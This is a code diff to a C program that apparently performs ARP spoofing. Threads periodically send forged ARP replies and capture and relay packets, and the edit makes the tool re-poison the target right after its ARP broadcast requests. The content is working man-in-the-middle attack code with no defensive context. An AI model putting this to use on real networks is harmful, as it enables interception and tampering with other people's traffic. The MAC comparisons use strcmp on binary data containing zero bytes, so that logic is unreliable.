@@ -159,7 +159,7 @@ void *send_arp_as_thread(void *multiple_args){
         }
         printf("\n");
         pthread_mutex_unlock(&mutex);
-        sleep(10);
+        sleep(15);
     }
 }
 
@@ -270,8 +270,9 @@ void *relay_ip_as_thread(void *multiple_args){
             pthread_mutex_lock(&mutex);
             printf("ARP packet captured\n");
             arph_rel = (ARP_HDR*)(packet+14);
-            u_char desti_mac[6];
+            u_char desti_mac[6], source_mac[6];
             memcpy(desti_mac,arph_rel->desti_mac,sizeof(arph_rel->desti_mac));
+            memcpy(source_mac,arph_rel->source_mac,sizeof(arph_rel->source_mac));
             u_short frame_length = sizeof(*eth_rel)+sizeof(*arph_rel);
             for (int i=0; i<frame_length; i++){
                 if(i%16==0){
@@ -280,14 +281,14 @@ void *relay_ip_as_thread(void *multiple_args){
                 printf("%.2x",packet[i]);
             }
             printf("\n");
-            if(strcmp((char*)desti_mac,"\x00\x00\x00\x00\x00\x00")==0){
+            // printf("ARP_SRC_FROM_SENDER_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",source_mac[0] , source_mac[1] , source_mac[2] , source_mac[3] , source_mac[4] , source_mac[5]);
+            // printf("OUR_SRC_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",sender_mac[0] , sender_mac[1] , sender_mac[2] , sender_mac[3] , sender_mac[4] , sender_mac[5]);
+            if(strcmp((char*)desti_mac,"\x00\x00\x00\x00\x00\x00")==0 and strcmp((char *)source_mac,(char *)sender_mac)==0){
                 printf("#####Send ARP Spoofing Packet After ARP Broadcasting#####\n");
                 assign_ether((char *)my_mac, &eth_spoofing, "");
                 assign_arp((char *)my_mac, &eth_spoofing, &arph_spoofing, &sender_ip, "", &my_ip);
                 send_arp(&eth_spoofing, &arph_spoofing, handle);
             }
-            //printf("ARP_DEST_FROM_SENDER_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",desti_mac[0] , desti_mac[1] , desti_mac[2] , desti_mac[3] , desti_mac[4] , desti_mac[5]);
-            //if(strcmp(desti_mac,"00000000"))
             pthread_mutex_unlock(&mutex);
         }
         printf("\n");
